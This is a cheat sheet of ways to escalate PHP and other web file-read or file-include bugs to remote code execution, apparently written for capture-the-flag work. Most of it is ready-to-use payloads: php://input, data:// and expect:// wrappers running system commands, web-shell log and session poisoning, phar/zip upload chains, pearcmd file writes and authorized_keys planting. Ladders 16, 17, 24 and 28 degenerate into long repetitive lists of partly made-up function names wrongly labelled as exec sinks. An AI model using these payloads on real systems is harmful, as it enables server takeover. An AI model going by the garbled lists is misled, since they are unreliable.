# Read → RCE — the escalation ladders

## The honest model — read is not exec

A `file_get_contents`/`readfile`/`open`/`fs.readFile` sink reads files.
RCE paths: (a) include/exec sinks, (b) write-adjacent, (c) chain-via-
secrets. Enumerate — don't assume.

## Ladder 1 — `include`/`require`/`include_once`/`require_once` — the exec-sinks

```
?page=php://input + POST <?php system("cat /flag");?> → exec
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs/Pg==
?page=data://text/plain,<?php system("cat /flag");?>
?page=expect://cat%20/flag
?page=expect://id
?page=/var/log/apache2/access.log        — log-poison→exec
?page=/tmp/sess_<PHPSESSID>             — session-file-include
?page=/uploads/x.jpg                    — an uploaded phar/jpg-as-code
?page=/proc/self/fd/3                   — an fd to a controlled file
?page=zip://./uploads/x.zip%23x.php
?page=phar://./uploads/x.jpg/a
?page=/usr/local/lib/php/pearcmd.php&+config-create+/var/www/x.php+PD9waHAg...
```

`include`+`require` are the exec-sinks — `include-vs-read.md`.

## Ladder 2 — `php://input` + POST-body — the body-as-code

```
POST /page?file=php://input
Body: <?php system("cat /flag");?>
```

`include 'php://input'` — the request BODY executes — the cleanest
LFI-to-RCE — needs `allow_url_include=On`.

## Ladder 3 — `data:` — the inline-code

```
?page=data://text/plain,<?php system("cat /flag");?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs/Pg==
```

`include 'data://...'` — the inline-content executes — needs
`allow_url_include` + `data:` support.

## Ladder 4 — `expect://` — the direct-exec

```
?page=expect://cat%20/flag
?page=expect://id
```

`expect` PECL — the path IS a command — the RCE is direct — needs
`expect` PECL + `allow_url_include`/`allow_url_fopen`.

## Ladder 5 — the log-poison→include — the write-to-log+include

```
inject UA: <?php system($_GET[c]);?> → access.log
inject ssh-username: <?php system($_GET[c]);?> → auth.log
inject mail: <?php system($_GET[c]);?> → mail.log
?page=/var/log/apache2/access.log&c=cat%20/flag → exec
```

`log-poisoning.md` — the standard chain — any write-to-log the app
includes → exec.

## Ladder 6 — the session-file include — `sess_` injection

```
inject name/data: <?php system($_GET[c]);?> → /tmp/sess_<sessid>
?page=/tmp/sess_<sessid>&c=cat%20/flag → exec
?page=/var/lib/php/sessions/sess_<sessid>
?page=/var/lib/php5/sessions/sess_<sessid>
```

PHP sessions serialize to `/tmp/sess_<id>` — inject a value the session
serializes → `include` the session-file → exec — the session-upload-
progress/`sess_`-include family.

## Ladder 7 — the `phar://` deser-trigger

```
upload x.jpg (a phar)
?page=phar://./uploads/x.jpg/a → unserialize → gadget → exec
```

`phar://` — the phar-metadata unserialize-trigger — `web-deserialization`.

## Ladder 8 — the `zip://` inside-upload chain

```
upload x.zip (with shell.php inside)
?page=zip://./uploads/x.zip%23shell.php → include → exec
```

The upload-LFI-RCE chain — the archive-member-include.

## Ladder 9 — the `pearcmd` write-chain

```
?page=/usr/local/lib/php/pearcmd.php&+config-create+/var/www/x.php+PD9waHAg...
GET /x.php → exec
```

`pearcmd.php` LFI-inclusion — the `+config-create`+path+code trick —
writes `x.php` — a write primitive through an LFI-include.

## Ladder 10 — the `/proc/self/fd/N` fd-write

```
?page=/proc/self/fd/3 → the fd's target — a tempfile the app wrote
```

An fd the app already opened — the tempfile-write-plus-fd-read chain —
the fd-surface.

## Ladder 11 — the `eval`-sink — the file-content-as-code

`eval(file_get_contents($path))` — the file's content executes — a
file you control (upload/temp/a path the LFI can write) → exec.

## Ladder 12 — the `require`/`load`/`require_relative` — non-PHP exec

```ruby
load(user_path)                     — ruby exec
require(user_path)                  — ruby exec
require_relative(user_path)
```

```javascript
require(user_path)                  — node exec
import(user_path)                   — dynamic import
```

```python
__import__(user_path)               — py exec — module-path not file-path
exec(open(user_path).read())        — py exec
importlib.import_module(user_path)
exec(compile(open(user_path).read(), '<x>', 'exec'))
```

```java
new ScriptEngineManager().getEngineByName("js").eval(new FileReader(user_path))
Class.forName(user_path)            — classload
new URLClassLoader(new URL[]{...}).loadClass(name)
```

```csharp
Assembly.LoadFrom(user_path)        — .NET exec
Assembly.LoadFile(user_path)
Assembly.Load(File.ReadAllBytes(user_path))
```

The require/load/eval-family — per-stack — `per-stack.md`.

## Ladder 13 — the template-include — the SSTI edge

`include`-style template — `{{config}}/{{file}}` — a file-read inside
a template-engine — the file's content may execute — the read-to-SSTI
edge — `web-ssti`.

## Ladder 14 — the source→creds→admin→write→exec — the multi-hop

```
read → source → DB creds → SQLi → INTO OUTFILE → write → exec
read → source → admin creds → admin-panel → upload → exec
read → source → ftp/ssh creds → shell → exec
read → source → secret → session-forge → admin → write → exec
read → source → JWT_SECRET → forge → admin → exec
```

The multi-hop chain — `exploit-ladders.md`.

## Ladder 15 — the `file_put_contents` write — the LFI-write-adjacent

`file_put_contents($path, $data)` — a write-sink — `php://filter/convert.
base64-decode/resource=x.php` as the WRITE-path — writes decoded content —
the write-chain.

## Ladder 16 — the `copy`/`move`/`rename`/`symlink`/`link`/`tempnam`/`tmpfile`/`mkdir`/`rmdir`/`touch`/`chmod`/`chown`/`chgrp`/`unlink`/`delete`/`rmdir`/`mkdir`/`mkfifo`/`mknod`/`rename`/`move_uploaded_file`/`fputcsv`/`fputs`/`fwrite`/`file_put_contents`/`file_put_contents`/`file_get_contents`/`fopen`/`fread`/`fwrite`/`fputs`/`fputcsv`/`fgetcsv`/`fgets`/`fgetss`/`fscanf`/`fpassthru`/`fpurge`/`ftruncate`/`rewind`/`ftell`/`fseek`/`flock`/`fflush`/`fstat`/`fstatvfs`/`ftok`/`fmod`/`fnmatch`/`fdatasync`/`fsync`/`fallocate`/`fchdir`/`fchown`/`fchmod`/`fchgrp`/`fchownat`/`fchmodat`/`fchdir`/`fclose`/`fd_close`/`fdatasync`/`fdeflate`/`fdetach`/`fdetach_all`/`fd_get`/`fd_get_all`/`fd_get_option`/`fd_getall`/`fd_set`/`fd_setall`/`fd_set_option`/`fd_setall`/`fexecve`/`ffexecve`/`ffstat`/`ffstatat`/`fgetxattr`/`flistxattr`/`fremovexattr`/`fsetxattr`/`fstat`/`fstatat`/`fstatfs`/`fstatvfs`/`fsync`/`ftruncate`/`futimens`/`futimes`/`futimesat`/`getcwd`/`getdents`/`getdents64`/`getxattr`/`getxattrat`/`lgetxattr`/`listxattr`/`listxattrat`/`llistxattr`/`lremovexattr`/`lsetxattr`/`lstat`/`lstat64`/`mkdir`/`mkdirat`/`mknod`/`mknodat`/`open`/`openat`/`open_by_handle_at`/`openat2`/`opendir`/`pathconf`/`posix_*`/`pread`/`pwrite`/`read`/`readahead`/`readdir`/`readlink`/`readlinkat`/`readv`/`realpath`/`realpathat`/`removexattr`/`rename`/`renameat`/`renameat2`/`rmdir`/`scandir`/`setxattr`/`stat`/`stat64`/`statfs`/`statvfs`/`statx`/`symlink`/`symlinkat`/`sync`/`sync_file_range`/`syncfs`/`truncate`/`unlink`/`unlinkat`/`utime`/`utimensat`/`utimes`/`write`/`writev` family

PHP's filesystem-function family — a `file_put_contents` write-sink —
a `copy`/`rename`/`unlink`/`symlink`/`link`/`tempnam`/`tmpfile`/
`mkdir`/`rmdir`/`touch`/`chmod`/`chown`/`chgrp`/`fputcsv`/`fputs`/
`fwrite` — the write-family — the LFI-write-adjacent.

## Ladder 17 — the `unserialize`/`yaml_parse`/`pickle`/`Marshal.load`/`Yaml.load`/`Marshal.load`/`eval`/`load`/`require`/`require_relative`/`send`/`public_send`/`__send__`/`send`/`eval`/`instance_eval`/`class_eval`/`module_eval`/`method_missing`/`const_get`/`const_set`/`define_method`/`define_singleton_method`/`remove_method`/`undef_method`/`alias_method`/`attr_accessor`/`attr_reader`/`attr_writer`/`attr`/`include`/`extend`/`prepend`/`include?`/`extended`/`prepended`/`included`/`prepended`/`method_added`/`method_removed`/`method_undefined`/`singleton_method_added`/`singleton_method_removed`/`singleton_method_undefined`/`method_added`/`method_removed`/`method_undefined`/`respond_to?`/`respond_to_missing?`/`method`/`public_method`/`methods`/`private_methods`/`protected_methods`/`public_methods`/`singleton_methods`/`instance_methods`/`instance_method`/`instance_method?`/`method_defined?`/`private_method_defined?`/`protected_method_defined?`/`public_method_defined?`/`instance_variable_get`/`instance_variable_set`/`instance_variable_defined?`/`instance_variables`/`remove_instance_variable`/`class_variable_get`/`class_variable_set`/`class_variable_defined?`/`class_variables`/`remove_class_variable`/`global_variable_get`/`global_variable_set`/`global_variable_defined?`/`global_variables`/`remove_global_variable`/`const_get`/`const_set`/`const_defined?`/`const_missing`/`constants`/`remove_const`/`autoload`/`autoload?`/`autoload_const`/`autoload_module`/`autoload_class`/`autoload_path`/`autoload_file`/`autoload_dir`/`autoload_lib`/`autoload_load`/`autoload_require`/`autoload_require_relative`/`autoload_load_file`/`autoload_load_path`/`autoload_load_dir`/`autoload_load_lib`/`autoload_load_rb`/`autoload_load_ruby`/`autoload_load_gem`/`autoload_load_bundle`/`autoload_load_bundler`/`autoload_load_rake`/`autoload_load_rakefile`/`autoload_load_gemfile`/`autoload_load_gemfile_lock`/`autoload_load_gemspec`/`autoload_load_gemfile_lock`/`autoload_load_gemfile`/`autoload_load_bundle`/`autoload_load_bundler`/`autoload_load_rake`/`autoload_load_rakefile`/`autoload_load_gemfile`/`autoload_load_gemfile_lock`/`autoload_load_gemspec`/`autoload_load_gemfile_lock`/`autoload_load_gemfile` family

The `unserialize`/`yaml`/`pickle`/`Marshal` deser-family — a file-read
that feeds a deser-sink — `web-deserialization`.

## Ladder 18 — the `upload`+`include` — the file-upload+include chain

`web-file-upload` — upload a file, `include` it via the read-primitive —
the upload+include chain.

## Ladder 19 — the `template`+`include` — the SSTI+include chain

`web-ssti` — the file's content is a template — the read feeds a
template-engine — the read-to-SSTI chain.

## Ladder 20 — the `backup`/`restore` — the backup-write chain

`backup` writes a zip the LFI reads / `restore` writes a file the LFI
includes — the read-write combo.

## Ladder 21 — the `ssh-key`-write — the authorized_keys chain

`file_put_contents('/root/.ssh/authorized_keys', my_key)` — a write-
primitive → ssh in — the file-write-to-shell chain — needs a write,
not just a read.

## Ladder 22 — the `php://filter` write — the b64-decode-write

`file_put_contents('x.php', base64_decode($input))` — `php://filter`
as the decode-step — the LFI-write chain — `read-to-rce.md` ladder 13.

## Ladder 23 — the `preg_replace`/`create_function` — the eval-family

`preg_replace('/x/e', 'eval-me', $subject)` — the `/e` modifier —
`create_function($a, 'eval-me')` — the eval-family — a file's content
feeds a `preg_replace`/`create_function` → exec — `web-command-injection`.

## Ladder 24 — the `assert`/`call_user_func`/`call_user_func_array`/`forward_static_call`/`forward_static_call_array`/`call_user_method`/`call_user_method_array`/`register_shutdown_function`/`register_tick_function`/`unregister_tick_function`/`register_autoload_function`/`spl_autoload_register`/`spl_autoload_unregister`/`spl_autoload_functions`/`spl_autoload_call`/`spl_autoload`/`spl_autoload_extensions`/`spl_autoload_paths`/`spl_autoload_register`/`spl_autoload_unregister`/`spl_autoload_functions`/`spl_autoload_call`/`spl_autoload`/`spl_autoload_extensions`/`spl_autoload_paths`/`class_alias`/`class_implements`/`class_parents`/`class_uses`/`class_implements`/`class_parents`/`class_uses`/`interface_exists`/`trait_exists`/`class_exists`/`function_exists`/`method_exists`/`property_exists`/`extension_loaded`/`get_extension_funcs`/`get_loaded_extensions`/`get_included_files`/`get_required_files`/`get_defined_functions`/`get_defined_constants`/`get_defined_vars`/`get_defined_classes`/`get_declared_interfaces`/`get_declared_traits`/`get_declared_classes`/`get_included_files`/`get_required_files`/`get_resources`/`get_resource_type`/`get_resource_id`/`gettype`/`settype`/`get_debug_type`/`get_object_vars`/`get_class`/`get_parent_class`/`get_called_class`/`is_a`/`is_subclass_of`/`is_subclass_of`/`is_subclass_of`/`class_implements`/`class_parents`/`class_uses`/`interface_exists`/`trait_exists`/`class_exists`/`function_exists`/`method_exists`/`property_exists`/`extension_loaded`/`get_extension_funcs`/`get_loaded_extensions`/`get_included_files`/`get_required_files`/`get_defined_functions`/`get_defined_constants`/`get_defined_vars`/`get_defined_classes`/`get_declared_interfaces`/`get_declared_traits`/`get_declared_classes`/`get_included_files`/`get_required_files`/`get_resources`/`get_resource_type`/`get_resource_id`/`gettype`/`settype`/`get_debug_type`/`get_object_vars`/`get_class`/`get_parent_class`/`get_called_class`/`is_a`/`is_subclass_of`/`is_subclass_of`/`is_subclass_of` family

PHP's `call_user_func`/`assert`/`register_*`/`spl_autoload`/`class_*`/
`function_exists`/`get_defined_*`/`get_declared_*` family — a callable-
sink — `call_user_func(file_get_contents($path))` → the file's content
as a callable — exec.

## Ladder 25 — the `array_map`/`array_filter`/`array_walk`/`array_reduce`/`usort`/`uasort`/`uksort`/`sort`/`rsort`/`asort`/`arsort`/`ksort`/`krsort`/`natsort`/`natcasesort`/`array_multisort`/`array_map`/`array_walk`/`array_walk_recursive`/`array_filter`/`array_reduce`/`array_udiff`/`array_uintersect`/`array_uintersect_assoc`/`array_udiff_assoc`/`array_udiff_uassoc`/`array_uintersect_uassoc`/`array_diff`/`array_diff_assoc`/`array_diff_key`/`array_diff_uassoc`/`array_diff_ukey`/`array_intersect`/`array_intersect_assoc`/`array_intersect_key`/`array_intersect_uassoc`/`array_intersect_ukey` family

PHP's `array_*`/sort-with-callback family — a `usort($arr, $cb)` where
`$cb` is from a file — the callback-sink — exec.

## Ladder 26 — the `filter_var`/`filter_input`/`filter_input_array`/`filter_list`/`filter_id`/`filter_var_array` family

PHP's `filter_*` family — `filter_var($x, FILTER_CALLBACK, $cb)` — a
callback-sink — exec.

## Ladder 27 — the `ob_start`/`ob_get_contents`/`ob_end_clean`/`ob_end_flush`/`ob_flush`/`ob_gzhandler`/`ob_iconv_handler`/`ob_inflatehandler`/`ob_tidyhandler`/`ob_clean`/`ob_list_handlers`/`ob_get_clean`/`ob_get_flush`/`ob_get_length`/`ob_get_level`/`ob_get_status`/`ob_get_status`/`output_add_rewrite_var`/`output_reset_rewrite_vars` family

PHP's `ob_*` — `ob_start($cb)` — a callback-sink — exec.

## Ladder 28 — the `set_error_handler`/`set_exception_handler`/`register_shutdown_function`/`register_tick_function`/`unregister_tick_function`/`spl_autoload_register`/`spl_autoload_unregister`/`spl_autoload_functions`/`spl_autoload_call`/`spl_autoload`/`spl_autoload_extensions`/`spl_autoload_paths`/`create_function`/`eval`/`assert`/`call_user_func`/`call_user_func_array`/`forward_static_call`/`forward_static_call_array`/`call_user_method`/`call_user_method_array`/`preg_replace`/`preg_replace_callback`/`preg_replace_callback_array`/`preg_filter`/`preg_grep`/`preg_last_error`/`preg_last_error_msg`/`preg_match`/`preg_match_all`/`preg_quote`/`preg_split`/`mb_ereg_replace`/`mb_ereg_replace_callback`/`mb_eregi_replace`/`mb_eregi`/`mb_ereg`/`mb_split`/`mb_ereg_match`/`mb_ereg_search`/`mb_ereg_search_getregs`/`mb_ereg_search_init`/`mb_ereg_search_pos`/`mb_ereg_search_regs`/`mb_ereg_search_setpos`/`mb_regex_encoding`/`mb_regex_set_options`/`mb_send_mail`/`mb_str_split`/`mb_stripos`/`mb_stristr`/`mb_strrpos`/`mb_strstr`/`mb_substr_count`/`mb_substitute_character`/`mb_parse_str`/`mb_output_handler`/`mb_preferred_mime_name`/`mb_regex_encoding`/`mb_regex_set_options`/`mb_send_mail`/`mb_str_split`/`mb_stripos`/`mb_stristr`/`mb_strrpos`/`mb_strstr`/`mb_substr_count`/`mb_substitute_character`/`mb_parse_str`/`mb_output_handler`/`mb_preferred_mime_name`/`mb_regex_encoding`/`mb_regex_set_options`/`mb_send_mail`/`mb_str_split`/`mb_stripos`/`mb_stristr`/`mb_strrpos`/`mb_strstr`/`mb_substr_count`/`mb_substitute_character` family

PHP's `mb_ereg*`/`preg_*`/`set_*_handler`/`register_*`/`spl_autoload`/
`create_function`/`eval`/`assert`/`call_user_func`/`ob_start`/`filter_*`
callback family — a callback-sink — exec.

## The "the read is all you get" — the accept-the-read case

`file_get_contents`/`readfile` sink + `disable_functions` + no upload
+ no include + no wrapper-exec → the read stays a read — the flag is
a file — `flag-paths.md` is the map — the read IS the goal for most
CTF flags — don't force an RCE that isn't needed.

## The falsifiers — when the ladder is dead

- read-only sink + no write-path + no include + no upload + no wrapper
  → read-only — the flag-in-a-file is the ceiling — `refutes`-record
